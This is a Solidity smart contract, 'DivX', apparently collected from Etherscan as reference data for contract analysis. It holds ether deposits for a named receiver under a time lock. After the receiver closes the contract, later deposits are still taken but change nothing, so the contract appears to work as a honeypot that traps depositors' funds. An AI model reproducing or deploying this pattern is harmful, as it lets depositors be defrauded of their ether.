/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.23;

contract DivX
{
    address  sender;
    address  receiver;
    uint unlockTime = 86400 * 7;
    bool closed = false;
 
    function PutDiv(address _receiver) public payable {
        if( (!closed&&(msg.value >=0.25 ether)) || sender==0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    
    function SetDivTime(uint _unixTime) public {
        if(msg.sender==sender) {
            unlockTime = _unixTime;
        }
    }
    
    function GetDiv() public payable {
        if(receiver==msg.sender&&now>unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function CloseDiv() public {
        if (msg.sender==receiver&&receiver!=0x0) {
           closed=true;
        } else revert();
    }
    
    function() public payable{}
}